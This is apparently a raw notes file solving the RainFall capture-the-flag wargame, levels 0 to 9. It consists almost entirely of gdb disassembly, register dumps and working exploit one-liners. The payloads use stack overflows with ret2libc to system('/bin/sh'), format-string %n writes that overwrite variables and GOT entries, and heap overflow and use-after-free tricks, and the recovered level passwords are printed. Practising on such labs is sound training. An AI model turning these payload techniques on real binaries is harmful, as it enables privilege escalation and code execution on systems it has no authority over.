flag0:
0x1a7 is 423
level0@RainFall:~$ l
level0*
level0@RainFall:~$ id
uid=2020(level0) gid=2020(level0) groups=2020(level0),100(users)
level0@RainFall:~$ ./level0 423
$ id
uid=2030(level1) gid=2020(level0) groups=2030(level1),100(users),2020(level0)
$ whoami
level1
$ pwd
/home/user/level0
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

flag1:
level1@RainFall:~$ python -c 'print "a"*72 + "\x9d\x84\x04\x08"' | ./level1
Illegal instruction (core dumped)
\x9d\x84\x04\x08 isn't the correct address of the function we wish to call
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave
 804847f:	c3                   	ret

08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
 8048486:	83 ec 50             	sub    $0x50,%esp
 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
 804848d:	89 04 24             	mov    %eax,(%esp)
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
 8048496:	c3                   	ret
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

flag2:
level2@RainFall:~$ python -c 'print "a"*72 + "\xd4\x84\x04\x08"' | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaԄ
(0xbffff700)

Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
=> 0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.

(gdb) b *0x08048500
Breakpoint 5 at 0x8048500
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x080484da in p ()
(gdb) c
Continuing.

Breakpoint 3, 0x080484e7 in p ()
(gdb) c
Continuing.
sdfsdf

Breakpoint 2, 0x080484f2 in p ()
(gdb) c
Continuing.

Breakpoint 5, 0x08048500 in p ()
(gdb) set $eax=0xb0000000
(gdb) c
Continuing.

Breakpoint 4, 0x08048507 in p ()
(gdb) i r
eax            0xb0000000	-1342177280
ecx            0xb7fd28c4	-1208145724
edx            0xbffff69c	-1073744228
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff680	0xbffff680
ebp            0xbffff6e8	0xbffff6e8
esi            0x0	0
edi            0x0	0
eip            0x8048507	0x8048507 <p+51>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $eax=0xbffff700
(gdb) c
Continuing.
(0x804854a) -> final address
[Inferior 1 (process 2803) exited with code 01]
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
level2@RainFall:~$ python -c 'print "a"*76 + "\xd4\x84\x04\x08" + "\x60\xb0\xe6\xb7"' | ./level2
(0xb7e6b060)
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
level2@RainFall:~$ cat /tmp/getenv.c
#include <stdlib.h>
#include <stdio.h>

int main(int ac, char **av)
{
	printf("Variable %s at address %p\n", av[1], getenv(av[1]));
}
level2@RainFall:~$ gcc /tmp/getenv.c -o /tmp/aaa -> 3 characters ???!!!!!
level2@RainFall:~$ /tmp/lol SHELL
level2@RainFall:~$ /tmp/getenv 
Variable /bin/sh at address 0xbffff8f9
level2@RainFall:~$ python -c 'print "a"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\xf9\xf8\xff\xbf"' > /tmp/payload2
level2@RainFall:~$ cat /tmp/payload2 - | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>`��DUMM����

cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

flag3:
Breakpoint 2, 0x080484ad in v ()
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
=> 0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
(gdb) b *0x080484df
Breakpoint 3 at 0x80484df
(gdb) c
Continuing.
sdfsdfdsf
sdfsdfdsf

Breakpoint 3, 0x080484df in v ()
(gdb) i r
eax            0x0	0
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff4d0	0xbffff4d0
ebp            0xbffff6e8	0xbffff6e8
esi            0x0	0
edi            0x0	0
eip            0x80484df	0x80484df <v+59>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $eax=0x40
(gdb) c
Continuing.
Wait what?!
$ cat /home/user/level4/.pass
cat: /home/user/level4/.pass: Permission denied
$ id
uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)

http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
For every format string exploit, our payload will eventually look something like this: <address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn.

level3@RainFall:~$ python -c 'print "\x8c\x98\x49\x80" + "%p %p %p %p %p %p %p %p"' | ./level3
��I�0x200 0xb7fd1ac0 0xb7ff37d0 0x8049988c 0x25207025 0x70252070 0x20702520 0x25207025
(pattern repeats after %4p -> 0x804988c is fourth %p)
level3@RainFall:~$ python -c 'print "\x8c\x98\x49\x80" + "AAAA%5$p"' | ./level3
��I�AAAA0x41414141

use of %n:

#include<stdio.h>

int main()
{
  int c;
  printf("geeks for %ngeeks ", &c);
  printf("%d", c);
  getchar();
  return 0;
}
The above program prints “geeks for geeks 10”. The first printf() prints “geeks for geeks”. The second printf() prints 10 as there are 10 characters printed (the 10 characters are “geeks for “) before %n in first printf() and c is set to 10 by first printf(). In C printf(), %n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n.

level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" > /tmp/payload
level3@RainFall:~$ cat /tmp/payload - | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

flag4:
level4@RainFall:~$ ./level4
AAAA%12$p
AAAA0x41414141
level4@RainFall:~$ python -c 'print "\x10\x98\x49\x08" + "%12$p"' | ./level4
�I�0x08499810
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" > /tmp/payload
level4@RainFall:~$ cat /tmp/payload - | ./level4
(print the "first" 16930112 characters and then...)
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

flag5:
level5@RainFall:~$ python -c 'print "\x48\x98\x04\x08" + "%4$p"' | ./level5
H0x8049848
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
=> 0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
we found a jump!!

level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload
level5@RainFall:~$ cat /tmp/payload - | ./level5
[...]
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

flag6:
0x08048454 is the address of function <n>, which <system@plt>
level6@RainFall:~$ ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
(i can't believe this is it...)

flag7:

level7@RainFall:~$ ./level7 $(python -c "print 'A'*21") $(python -c "print 'A'*21")
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 $(python -c "print 'A'*20") $(python -c "print 'A'*30000")
~~
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0 -> "%s - %d\n"
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
(gdb) x/s 0x80486e0
0x80486e0:	 "%s - %d\n"
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
(gdb) x/s 0x8048703
0x8048703:	 "~~"
(gdb) disas 0x80483e0
Dump of assembler code for function strcpy@plt:
   0x080483e0 <+0>:	jmp    DWORD PTR ds:0x8049920
   0x080483e6 <+6>:	push   0x18
   0x080483eb <+11>:	jmp    0x80483a0
End of assembler dump.
strcpy on argv[2]!!
r $(python -c "print 'A'*20") AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level7/level7 $(python -c "print 'A'*20") AAAA
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
=> 0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
(gdb) x/s $edx
0xbffff8c8:	 "AAAA"
level7@RainFall:~$ ./level7 $(python -c "print 'a'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1580134081

flag8:
(gdb) disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	push   edi
   0x08048568 <+4>:	push   esi
=> 0x08048569 <+5>:	and    esp,0xfffffff0
   0x0804856c <+8>:	sub    esp,0xa0
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0
   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac
   0x08048581 <+29>:	mov    eax,0x8048810
(gdb) x/s 0x8048810
0x8048810:	 "%p, %p \n"
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8

Breakpoint 1, 0x08048569 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x08048575 in main ()
(gdb) i r
eax            0x1	1
ecx            0xbffff794	-1073743980
edx            0xbffff724	-1073744092
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff650	0xbffff650
ebp            0xbffff6f8	0xbffff6f8
esi            0x0	0
edi            0x0	0
eip            0x8048575	0x8048575 <main+17>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.

Breakpoint 4, 0x0804857b in main ()
(gdb) i r
eax            0x1	1
ecx            0x0	0
edx            0xbffff724	-1073744092
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff650	0xbffff650
ebp            0xbffff6f8	0xbffff6f8
esi            0x0	0
edi            0x0	0
eip            0x804857b	0x804857b <main+23>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

$ecx and $edx are emptied.
=> 0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0
   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac

(gdb) b *0x08048586
Breakpoint 5 at 0x8048586
(gdb) c
Continuing.

Breakpoint 5, 0x08048586 in main ()
(gdb) set $ecx="coucou"
(gdb) c
Continuing.

Breakpoint 2, 0x08048591 in main ()
(gdb) c
Continuing.
(nil), 0x804a008
level8@RainFall:~$ ./level8 login
(nil), (nil)
login
Segmentation fault (core dumped)
(gdb) x/s 0x804882d
0x804882d:	 "login"
(gdb) x/s 0x804883b
0x804883b:	 "Password:\n"
(gdb) x/s 0x8049ab0
0x8049ab0 <service>:	 ""
(gdb) x/s 0x8048819
0x8048819:	 "auth "
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)

0x804a008, (nil)
(gdb) x/s 0x8049aac
0x8049aac <auth>:	 ""
(gdb) x/s 0x804881f
0x804881f:	 "reset"
(gdb) x/s 0x8048825
0x8048825:	 "service"
level8@RainFall:~$ ./level8 login $(python -c "print 'a'*800")
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
reset
0x804a008, (nil)
login
Password:
0x804a008, (nil)
reset
*** glibc detected *** ./level8: double free or corruption (fasttop): 0x0804a008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
./level8[0x8048678]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 12261      /home/user/level8/level8
08049000-0804a000 rwxp 00000000 00:10 12261      /home/user/level8/level8
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rwxp 00000000 00:00 0
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0
b7fd8000-b7fdd000 rwxp 00000000 00:00 0
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
Aborted (core dumped)
level8@RainFall:~$ ./level8
(nil), (nil)
service
(nil), 0x804a008
auth
0x804a018, 0x804a008
08048420 <free@plt>:
 8048420:	ff 25 3c 9a 04 08    	jmp    *0x8049a3c
 8048426:	68 08 00 00 00       	push   $0x8
 804842b:	e9 d0 ff ff ff       	jmp    8048400 <_init+0x3c>
https://heap-exploitation.dhavalkapil.com/attacks/double_free.html
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
reset
0x804a008, (nil)
service
0x804a008, 0x804a008
reset
0x804a008, 0x804a008
auth
0x804a008, 0x804a008
service
0x804a008, 0x804a018
reset
0x804a008, 0x804a018
serice
0x804a008, 0x804a018
service
0x804a008, 0x804a008
service
0x804a008, 0x804a028
service
0x804a008, 0x804a038
reset
0x804a008, 0x804a038

0x804a008, 0x804a038
service
0x804a008, 0x804a008
reset
0x804a008, 0x804a008
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

flag9:
level9@RainFall:~$ ./level9 $(python -c "print 'A'*109")
Segmentation fault (core dumped)
(gdb) b *0x08048629
Breakpoint 3 at 0x8048629
(gdb) c
Continuing.

Breakpoint 3, 0x08048629 in main ()
(gdb) i r
eax            0x804a008	134520840
ecx            0x0	0
edx            0xb7eec440	-1209088960
ebx            0x804a008	134520840
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048629	0x8048629 <main+53>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/s 0x804a008
0x804a008:	 ""
(gdb) x/s 0x804a008
0x804a008:	 ""
(gdb) disas 0x80486f6
Dump of assembler code for function _ZN1NC2Ei: -> <N::N(int)>
   0x080486f6 <+0>:	push   ebp
   0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret
End of assembler dump.
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc: -> <N::setAnnotation(char*)>
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
level9@RainFall:~$ c++filt
_Znwj
operator new(unsigned int)
(gdb) x memcpy
0xb7dc58c0 <memcpy>:	0xc3ade853
(gdb) r $(python -c "print 'A'*108 + 'B'*4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level9/level9 $(python -c "print 'A'*108 + 'B'*4")

Breakpoint 1, 0x08048677 in main ()
(gdb) x $esp
0xbffff650:	0xbffff85c0804a008
(gdb) x/16xg 0x0804a008
0x804a008:	0x0000000008048848	0x0000000000000000
0x804a018:	0x0000000000000000	0x0000000000000000
0x804a028:	0x0000000000000000	0x0000000000000000
0x804a038:	0x0000000000000000	0x0000000000000000
0x804a048:	0x0000000000000000	0x0000000000000000
0x804a058:	0x0000000000000000	0x0000000000000000
0x804a068:	0x0000000000000000	0x0000007100000005
0x804a078:	0x0000000008048848	0x0000000000000000
(gdb) ni
=> 0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
0x0804867c in main ()
(gdb) x/16xg 0x0804a008
0x804a008:	0x4141414108048848	0x4141414141414141
0x804a018:	0x4141414141414141	0x4141414141414141
0x804a028:	0x4141414141414141	0x4141414141414141
0x804a038:	0x4141414141414141	0x4141414141414141
0x804a048:	0x4141414141414141	0x4141414141414141
0x804a058:	0x4141414141414141	0x4141414141414141
0x804a068:	0x4141414141414141	0x4141414141414141
0x804a078:	0x0000000042424242	0x0000000000000000
(gdb) i r
eax            0x804a00c	134520844
ecx            0x42424242	1111638594
edx            0x804a07c	134520956
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x804867c	0x804867c <main+136>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) ni
=> 0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
0x08048680 in main ()
(gdb) x $eax
0x804a078:	 "BBBB"
(gdb) i r
eax            0x804a078	134520952
ecx            0x42424242	1111638594
edx            0x804a07c	134520956
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048680	0x8048680 <main+140>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) ni
=> 0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
0x08048682 in main ()
